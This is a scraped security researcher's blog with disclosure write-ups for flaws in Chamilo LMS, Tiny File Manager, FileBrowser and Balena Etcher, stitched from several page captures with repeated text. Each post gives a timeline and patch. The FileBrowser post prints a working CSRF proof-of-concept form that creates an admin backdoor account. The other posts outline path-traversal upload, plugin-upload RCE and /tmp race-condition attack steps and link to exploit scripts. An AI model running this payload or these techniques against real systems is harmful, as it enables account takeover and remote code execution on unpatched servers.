[22nd March 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/03/exploit-300x157-1.jpg?w=300)

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

<https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-79-2021-07-17-Moderate-impact-Low-risk-CSRF-in-global-chat-and-social-wall>

**Disclosure Timeline:**

July 27, 2021 – Contacted the vendor and reported the vulnerability

July 28, 2021 – Vendor replies back

August 2, 2021 – Vulnerability has been patched in version **1.11.16**

March 21, 2022 – CVE ID was assigned. CVE-2021-40662

**CVE Description**: *Chamilo LMS v1.11.14 was discovered to contain a zero click code injection vulnerability which allows attackers to execute arbitrary code via a crafted plugin. This vulnerability is triggered through user interaction with the attacker’s profile page.*

* One-Click Technique: An Attacker who has a student account can create a malicious web page or a malicious SVG image file and upload the file to the “My Productions” section of the student profile page, then he can copy the URL of that file and send it to the Chamilo Admin User. When the Admin user loads the file in his browser with an active chamilo session, in the background it will upload a plugin (.zip file) to chamilo. Then the attacker can simply navigate to /plugin/exploited-directory/ and execute malicious commands.
* “Zero Click” technique: In this case, the attacker abuses the “My Diplomas” feature and injects malicious javascript in it, and when the Admin visits the Attacker’s (student) profile page or Portfolio, the malicious javascript gets executed and the malicious plugin gets uploaded to the server. After that, the attacker can simply navigate to /plugin/exploit/ directory and execute the shell.php script and execute arbitrary commands. Advantages of this exploit: No need to upload a malicious file to /app/upload/users/ directory , No need to send a link or URL to the Admin. When the admin visits attacker’s profile, the attacker gets the RCE 😉 .

**Reference**: <https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE>

**Video Reference**:

<https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/raw/main/chamilo_csrf-rce_exploit.mp4>

**Exploit Code:** <https://raw.githubusercontent.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/main/zero-click.ht>

**Remediation:**

The Vulnerability has been patched from version 1.11.16

[<https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9>](https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9)

Thanks

# [Tiny File Manager Authenticated RCE](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

[23rd January 202215th March 2022](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/#respond)

**CVE-2021-45010**

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of which was a software named “[Tiny File Manager](https://github.com/prasathmani/tinyfilemanager)“. While poking around I was able to find an awesome vulnerability in the application that leads to code execution on the server. This article is going to be on that vulnerability.

**Disclosure Timeline:**

A similar Vulnerability was also reported by another researcher named “Omri Inbar”.

My disclosure timeline:

September 16, 2021 – Contacted the developer and reported the vulnerability

September 17, 2021 – Developer replies back

September 20, 2021 – Developer verified the issue

September 26, 2021 – I patched the source code, fixed the RCE, and sent a pull request to the original repository.

November 12, 2021 – The developer merged the commit. The vulnerability has been fixed.

**CVE-2021-45010**: A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project’s Tiny File Manager <= 2.4.3 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server.

**Vendor/Software Details**

TinyFileManager is a web-based file manager and it is a simple, fast, and small file manager with a single file, a multi-language ready web application for storing, uploading, editing, and managing files and folders online via the web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and build-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

Link: <https://github.com/prasathmani/tinyfilemanager>

**Authenticated RCE**

Tiny File Manager is a php based software. This particular vulnerability is present in the tinyfilemanager.php script. When the user logs in to the application, he is allowed to upload, download, edit files and those file are stored in a specific directory which is been specified in “config.php”. The particular vulnerability that I have found allows the user to upload files beyond the specified directory by tampering the “fullpath” parameter and add a bunch of “../” in front of the actual filename thus leads to breaking out of the file root directory that is specified in config.php.

This can be exploited to place php web-shells inside the web root directory of Tiny File Manager and achieve RCE.

Proof Of Concept:

*RCE*
1. An Attacker who has admin credentials or admin access to “Tiny FIle manager” app can upload arbitrary files to the server via Path Traversal i.e, appending “../../../../../../../” to the “fullpath parameter in the upload feature.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce.png?w=1024)

2. If the attacker could get the full Web Root directory of the “Tiny File Manager” app, he could upload php files there to achieve RCE.

3. To get the full Webroot directory path, we can abuse a path disclosure vulnerability in the URL upload feature. When a random rubbish URL is given as input, it throws an error message that reveals the full Webroot directory path.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_disclose.png?w=1024)

4. By combining these, we can achieve Command execution on the server.

I created an exploit script that automatically exploits the bug and get a shell:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce3.png?w=1024)

Download the Exploit: *<https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.sh>*

**The Patch:**

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA=w484-h87)](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA%3Ds1232)

<https://github.com/prasathmani/tinyfilemanager/pull/636/files/a93fc321a3c89fdb9bee860bf6df5d89083298d1>

👉  *Replace “./” with “\_” fixes the issue.*

**Thank You**

# [Critical CSRF in FileBrowser](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.wordpress.com_acf6d43c_20250115_193634.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Privilege Escalation Vulnerability in Balena Etcher Software

[22nd August 202422nd August 2024](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/08/etcher.webp?w=1024)

Local Privilege Escalation Vulnerability in Balena Etcher software in Ubuntu/Debian due to a race-condition issue.

Severity: **Medium**

Etcher is a popular cross-platform tool from balena.io to flash OS images onto SD cards and USB drives safely and easily. It is one of the most-popular USB flashing tools.

A Local Privilege Escalation flaw has been discovered in the latest version of Etcher <= v1.18.11 that allows an attacker with a low-privileged user account to create a directory named “etcher”
under /tmp, when the Admin user runs Etcher in his session, the attacker can achieve LPE.

This vulnerability arises due to the fact that, when someone runs Etcher, it creates a temporary directory under /tmp and writes a file under /tmp/etcher and the file will look something like “balena-etcher-electron-[random-uuid].cmd. Etcher then prompts for root/admin password, when admin enters the password, it then calls /tmp/etcher/balena-etcher-electron-[random-uuid].cmd and executes it with root privileges. Etcher then deletes the file and /tmp/etcher will be removed after a system reboot.

An attacker with a low-priv user account can exploit this behavior by creating his own /tmp/etcher directory, when the admin or any other user runs Etcher, it will write balena-etcher-electron-.cmd under attacker-owned /tmp/etcher directory.
The Attacker may not directly overwrite the file /tmp/etcher/balena-etcher-electron-[random-uuid].cmd because the file is created and owned by the admin or the user who ran Etcher, the attacker can just delete the /tmp/etcher directory as he is the owner of the directory and then he can again create /tmp/etcher directory and create a file that has exactly the same name as the file “balena-etcher-electron-[random-uuid].cmd” which is created by Etcher before. Etcher will then run the attacker’s malicious commands instead of the actual commands that are supposed to run.

Etcher creates the file before the password prompt and runs after the user enters the root/admin password, this is where the Race-Condition happens, attacker can create an automated script that creates /tmp/etcher and monitors it constantly, if a file is being created under /tmp/etcher it immediately deletes the directory and creates a fake /tmp/etcher/balena-etcher-electron-[random-uuid].cmd.

Limitation: The only limitation of the exploit is that while running the exploit, if there’s already /tmp/etcher present that means someone already ran Etcher Software before the exploit, a system reboot is required i.e., if there’s already a /tmp/etcher directory is present and that’s not owned by the attacker then the attacker should wait for a reboot.

Demo Scenario:

1. An attacker with a low privileged user (low-priv) access to the target.

2. Admin privileged user running etcher (adminuser) in Ubuntu.

Demo video: <https://github.com/febin0x10/etcher_privesc_exploit/raw/main/Etcher_privilege_escalation_linux_by_Febin.mp4>

Download Exploit: <https://github.com/febin0x10/etcher_privesc_exploit.git>

Software Information:

Etcher is a popular SD card flasher app that is simple for end users, extensible for developers, and works on any platform.

Official Website: <https://etcher.balena.io/>
Github Repo: <https://github.com/balena-io/etcher>
Download Vulnerable version(.deb): <https://github.com/balena-io/etcher/releases/download/v1.18.11/balena-etcher_1.18.11_amd64.deb>

Update Etcher to its latest version!

### Share this:

* [Twitter](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/?share=twitter "Click to share on Twitter")
* [Facebook](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

# Post navigation

[← CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

### Leave a comment [Cancel reply](/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* [Comment](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/pdF9Nn-2v)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/155)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from raw.githubusercontent.com_179e062f_20250115_193636.html ===

# Hello Admin. This is a Zero Click Vuln



=== Content from febin0x4e4a.wordpress.com_c15dfcda_20250115_193602.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Critical CSRF in FileBrowser

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

### Share this:

* [Twitter](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=twitter "Click to share on Twitter")
* [Facebook](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)
[CVE-2021-46398](https://febin0x4e4a.wordpress.com/tag/cve-2021-46398/), [Exploit](https://febin0x4e4a.wordpress.com/tag/exploit/), [Hacking](https://febin0x4e4a.wordpress.com/tag/hacking/), [Security Research](https://febin0x4e4a.wordpress.com/tag/security-research/), [Vulnerability](https://febin0x4e4a.wordpress.com/tag/vulnerability/)

# Post navigation

[Tiny File Manager Authenticated RCE →](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

### Leave a comment [Cancel reply](/2022/01/19/critical-csrf-in-filebrowser/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
